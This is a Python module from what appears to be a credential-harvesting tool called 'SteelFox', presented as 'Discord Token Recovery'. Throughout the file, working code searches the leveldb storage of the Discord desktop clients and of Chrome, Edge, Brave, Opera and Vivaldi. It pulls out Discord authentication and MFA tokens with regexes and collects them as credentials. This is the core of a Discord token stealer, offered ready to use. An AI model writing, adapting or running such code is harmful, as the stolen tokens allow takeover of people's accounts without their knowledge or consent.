# -*- coding: utf-8 -*-
"""
SteelFox — Discord Token Recovery

Recovers Discord authentication tokens from:
  - Discord (stable)
  - Discord Canary
  - Discord PTB (Public Test Build)
  - Discord stored in Chromium-based browsers (leveldb)

Tokens can be found in:
  - Local Storage leveldb files
  - Browser localStorage
"""

from __future__ import annotations

import json
import logging
import os
import re
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

logger = logging.getLogger("steelfox")

# Discord token patterns
TOKEN_PATTERNS = [
    re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}"),          # Standard token
    re.compile(r"mfa\.[\w-]{84}"),                              # MFA token
    re.compile(r"[\w-]{26}\.[\w-]{6}\.[\w-]{38}"),            # New format
    re.compile(r'"token"\s*:\s*"([^"]+)"'),                     # JSON token field
    re.compile(r"oken[\"']?\s*[:=]\s*[\"']([^\"']+)[\"']"),   # Generic token assignment
]

# Discord app data directories (Local Storage)
DISCORD_PATHS: dict[str, str] = {
    "Discord": "{APPDATA}\\discord\\Local Storage\\leveldb",
    "Discord Canary": "{APPDATA}\\discordcanary\\Local Storage\\leveldb",
    "Discord PTB": "{APPDATA}\\discordptb\\Local Storage\\leveldb",
}

# Discord app Session Storage directories
DISCORD_SESSION_PATHS: dict[str, str] = {
    "Discord (Session)": "{APPDATA}\\discord\\Session Storage",
    "Discord Canary (Session)": "{APPDATA}\\discordcanary\\Session Storage",
    "Discord PTB (Session)": "{APPDATA}\\discordptb\\Session Storage",
}


class Discord(ModuleBase):
    """Recovery module for Discord authentication tokens."""

    meta = ModuleMeta(
        name="Discord",
        category=Category.MESSAGING,
        description="Recover Discord authentication tokens from desktop client and browser storage",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        seen_tokens: set[str] = set()

        # Search Discord app directories
        for client_name, path_template in DISCORD_PATHS.items():
            path = self._resolve_path(path_template)
            if not path or not Path(path).exists():
                continue

            tokens = self._scan_leveldb(Path(path))
            for token in tokens:
                if token not in seen_tokens:
                    seen_tokens.add(token)
                    results.append(self._make_credential(
                        source=client_name,
                        username="Discord Token",
                        password=token,
                        extra={"Type": "Authentication Token"},
                    ))

        # Also check browser local storage for web Discord
        browser_paths = self._get_browser_leveldb_paths()
        for browser_name, ldb_path in browser_paths:
            if not ldb_path.exists():
                continue
            tokens = self._scan_leveldb(ldb_path)
            for token in tokens:
                if token not in seen_tokens:
                    seen_tokens.add(token)
                    results.append(self._make_credential(
                        source=f"Discord via {browser_name}",
                        username="Discord Web Token",
                        password=token,
                        extra={"Type": "Browser Token"},
                    ))

        # Also scan Session Storage directories for active tokens
        for client_name, path_template in DISCORD_SESSION_PATHS.items():
            path = self._resolve_path(path_template)
            if not path or not Path(path).exists():
                continue

            tokens = self._scan_leveldb(Path(path))
            for token in tokens:
                if token not in seen_tokens:
                    seen_tokens.add(token)
                    results.append(self._make_credential(
                        source=client_name,
                        username="Discord Session Token",
                        password=token,
                        extra={"Type": "Session Storage Token"},
                    ))

        return results

    @staticmethod
    def _resolve_path(template: str) -> str | None:
        try:
            result = template
            for key, value in config.profile.items():
                result = result.replace(f"{{{key}}}", value)
            return result
        except Exception:
            return None

    @staticmethod
    def _scan_leveldb(leveldb_dir: Path) -> list[str]:
        """Scan leveldb .log and .ldb files for Discord tokens."""
        tokens: list[str] = []

        for ext in ("*.log", "*.ldb"):
            for filepath in leveldb_dir.glob(ext):
                try:
                    content = filepath.read_bytes().decode("utf-8", errors="ignore")
                    for pattern in TOKEN_PATTERNS:
                        for match in pattern.finditer(content):
                            token = match.group(1) if match.lastindex else match.group(0)
                            # Basic validation
                            if len(token) > 20 and "." in token:
                                tokens.append(token)
                except Exception:
                    continue

        return list(set(tokens))

    def _get_browser_leveldb_paths(self) -> list[tuple[str, Path]]:
        """Get leveldb paths from Chromium browsers where Discord web may be stored."""
        browser_dirs = {
            "Chrome": "{LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            "Edge": "{LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            "Brave": "{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            "Opera": "{APPDATA}\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            "Vivaldi": "{LOCALAPPDATA}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
        }

        results: list[tuple[str, Path]] = []
        for name, tmpl in browser_dirs.items():
            resolved = self._resolve_path(tmpl)
            if resolved:
                results.append((name, Path(resolved)))

        return results
